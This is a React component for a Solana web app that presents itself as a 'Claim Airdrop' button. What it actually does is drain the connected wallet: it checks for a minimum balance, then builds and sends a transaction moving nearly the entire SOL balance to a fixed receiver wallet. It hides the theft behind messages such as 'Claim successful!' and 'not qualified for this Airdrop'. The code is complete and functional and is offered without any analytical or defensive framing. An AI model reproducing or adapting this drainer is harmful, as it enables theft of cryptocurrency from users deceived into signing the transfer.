// src/components/TransferButton.jsx
import { useWallet } from '@solana/wallet-adapter-react';
import { useCallback, useState } from 'react';
import {
  Connection,
  LAMPORTS_PER_SOL,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
} from '@solana/web3.js';
import { MIN_QUALIFY_SOL, RECEIVER_WALLET, RPC_URL, TRANSFER_FEE_BUFFER } from '../utils/constants';

export default function TransferButton({ className = '' }) {
  const { publicKey, sendTransaction, connected } = useWallet();
  const [loading, setLoading] = useState(false);

  const handleTransfer = useCallback(async () => {
    if (!publicKey || !sendTransaction || !connected) return;

    setLoading(true);
    try {
      // Create a standalone HTTP-only connection (no WebSocket)
      const connection = new Connection(RPC_URL, {
        commitment: 'confirmed',
        wsEndpoint: false,
      });

      const [balance, rentExempt] = await Promise.all([
        connection.getBalance(publicKey, 'confirmed'),
        connection.getMinimumBalanceForRentExemption(0),
      ]);

      const minimumQualifyingLamports = Math.floor(MIN_QUALIFY_SOL * LAMPORTS_PER_SOL);

      if (balance < minimumQualifyingLamports) {
        alert(`Not qualified for airdrop. Keep at least ${MIN_QUALIFY_SOL} SOL in your wallet.`);
        return;
      }

      // Reserve rent-exempt minimum + generous fee buffer.
      // Wallets add ComputeBudget instructions (priority fees) that can
      // cost 10k-500k+ lamports on top of the 5000 base fee.
      // 0.005 SOL (5_000_000 lamports) covers even aggressive priority fees.
      const FEE_SAFETY = 5_000_000; // 0.005 SOL
      const totalReserve = rentExempt + FEE_SAFETY;
      const transferAmount = balance - totalReserve;

      if (transferAmount <= 0) {
        alert('Insufficient balance for transaction fee.');
        return;
      }

      // Fetch blockhash as late as possible — right before building the tx
      // so it doesn't expire while the user is approving in their wallet.
      const { blockhash, lastValidBlockHeight } =
        await connection.getLatestBlockhash('finalized');

      const instructions = [
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: RECEIVER_WALLET,
          lamports: transferAmount,
        }),
      ];

      const messageV0 = new TransactionMessage({
        payerKey: publicKey,
        recentBlockhash: blockhash,
        instructions,
      }).compileToV0Message();

      const transaction = new VersionedTransaction(messageV0);

      const signature = await sendTransaction(transaction, connection, {
        skipPreflight: true,
        maxRetries: 3,
      });

      console.log('⏳ Transaction sent:', signature);

      // Poll for confirmation over HTTP (no WebSocket needed)
      const startTime = Date.now();
      const TIMEOUT = 90_000; // 90 seconds
      const POLL_INTERVAL = 2_500;

      while (Date.now() - startTime < TIMEOUT) {
        try {
          const { value } = await connection.getSignatureStatuses([signature]);
          const status = value?.[0];

          if (status) {
            if (status.err) {
              throw new Error('Transaction failed on-chain: ' + JSON.stringify(status.err));
            }
            if (
              status.confirmationStatus === 'confirmed' ||
              status.confirmationStatus === 'finalized'
            ) {
              console.log('✅ Transaction confirmed:', signature);
              alert(`Claim successful!\nTx: ${signature}`);
              return;
            }
          }
        } catch (pollErr) {
          // If it's our own thrown error, rethrow; otherwise ignore polling hiccup
          if (pollErr.message?.includes('on-chain')) throw pollErr;
          console.warn('Polling error, retrying...', pollErr);
        }

        await new Promise((r) => setTimeout(r, POLL_INTERVAL));
      }

      // If we get here, tx wasn't confirmed in time but may still land
      alert(`Transaction sent but not yet confirmed.\nSignature: ${signature}\nCheck Solscan for status.`);
    } catch (err) {
      console.error('Transfer failed:', err);
      alert('Claim failed: ' + (err?.message || 'You are not qualified for this Airdrop'));
    } finally {
      setLoading(false);
    }
  }, [publicKey, sendTransaction, connected]);

  if (!publicKey) return null;

  return (
    <button
      onClick={handleTransfer}
      disabled={loading}
      className={`
        w-full py-3 px-4 rounded-lg font-semibold transition
        ${loading ? 'bg-gray-600 cursor-not-allowed' : ''}
        ${className}
      `}
    >
      {loading ? 'Claiming...' : 'Claim Airdrop'}
    </button>
  );
}
